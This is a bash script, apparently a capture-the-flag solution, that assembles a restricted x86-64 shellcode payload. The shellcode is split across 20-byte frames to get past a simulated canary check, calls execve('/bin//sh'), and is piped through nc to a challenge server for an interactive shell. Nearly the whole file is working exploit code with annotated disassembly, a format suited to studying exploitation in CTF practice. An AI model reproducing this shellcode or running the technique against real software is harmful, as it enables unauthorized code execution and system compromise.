#!/bin/bash

if [[ -e payload_6 ]]; then
    rm payload_6
fi

host="ctf.adl.tw"
port=10003

: << Illustration
* Space of local vars has 224 bytes, first byte is at rbp-0xe0
* There are two restrictions in order to simulate canary:
- Restriction one: The values of buf[i*20], buf[i*20+1], buf[i*20+2] must be respectively \x0c \x87 \x63
- Restriction two: The values cannot be \x90
* Must ensure that \x0c \x87 \x63 is used to form a valid instruction set
* Make best effort to align rip with 16 bytes
Illustration


# 20 bytes a frame
frame="\x0c\x87\x63"$(printf "\x01%.0s" $(seq 1 17))


# 0 ~ 3rd bytes
fill1="\x0c\x87\x63\x56"
: << Instruction
0c 87                   or    al, 0x87
63                      .byte 0x63
56                      push  rsi
Instruction

# 4 ~ 16th bytes
shellcode_part1="\x48\x31\xf6\x56\x48\x8d\x85\x60\xff\xff\xff\xff\xe0"
: << Instruction
48 31 f6                xor    rsi, rsi
56                      push   rsi
48 8d 85 60 ff ff ff    lea    rax, [rbp-0xa0]
ff e0                   jmp    rax  # jump to buf[64]
Instruction

# 17 ~ 19 + frame + frame + 60 ~ 63th bytes
fill2=$(printf "\x01%.0s" $(seq 17 19))$frame$frame"\x0c\x87\x63\x01"

# 64 ~ 79th bytes
shellcode_part2="\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x48\x8d\x45\xa0\xff\xe0"
: << Instruction
48 bf 2f 62 69 6e 2f    movabs rdi, 0x68732f2f6e69622f  # encoded from "/bin//sh"
2f 73 68
48 8d 45 a0             lea    rax, [rbp-0x60]
ff e0                   jmp    rax  # jump to buf[128]
Instruction

# frame + frame + 120 ~ 127 bytes
fill3=$frame$frame"\x0c\x87\x63"$(printf "\x01%.0s" $(seq 123 127))

# 128 ~ 136th bytes
shellcode_part3="\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05"
: << Instruction
57                      push   rdi
54                      push   rsp
5f                      pop    rdi
6a 3b                   push   0x3b
58                      pop    rax
99                      cdq
0f 05                   syscall
Instruction

fill4=$(printf "\x01%.0s" $(seq 137 139))$(printf "$frame%.0s" $(seq 1 3))

echo -ne $fill1$shellcode_part1$fill2$shellcode_part2$fill3$shellcode_part3$fill4 > payload_6

# Better than `cat payload_6 - | nc $host $port`
(cat payload_6; cat - ) | nc $host $port
